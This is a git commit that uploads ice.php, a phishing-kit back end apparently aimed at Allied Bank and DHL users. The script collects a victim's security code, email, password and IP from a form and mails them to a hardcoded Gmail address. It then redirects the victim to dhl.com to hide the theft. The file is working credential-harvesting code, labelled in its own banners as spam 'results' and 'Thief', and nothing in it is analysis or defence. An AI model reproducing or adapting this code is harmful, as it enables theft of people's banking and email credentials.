87b6eda8873849ad1e08c5e71deb21b78d925d94
user-loginmail <richard.adejumofirm@gmail.com>
2024-06-26 15:39:46 +0200

    Add files via upload

---
+++ ice.php
@@ -0,0 +1,28 @@
+<?
+
+$ip = getenv("REMOTE_ADDR");
+$message .= "--------------Ali Spam ReZulT-----------------------\n";
+
+$message .= "Security Code : ".$_POST['cid']."\n";
+$message .= "USERNAME : ".$_POST['email']."\n";
+$message .= "Password : ".$_POST['pass']."\n";
+$message .= "IP: ".$ip."\n";
+$message .= "---------------Created By AJ-Snoop------------------------------\n";
+
+$recipient = "sales.alwahabtrading@gmail.com";
+$subject = "Gbagam!";
+$headers = "From";
+$headers .= $_POST['eMailAdd']."\n";
+$headers .= "MIME-Version: 1.0\n";
+	 mail("", "Allied Bank Spam RezulT(Thief)", $message);
+if (mail($recipient,$subject,$message,$headers))
+	   {
+		   header("Location: http://www.dhl.com");
+
+	   }
+else
+    	   {
+ 		echo "ERROR! Please go back and try again.";
+  	   }
+
+?>
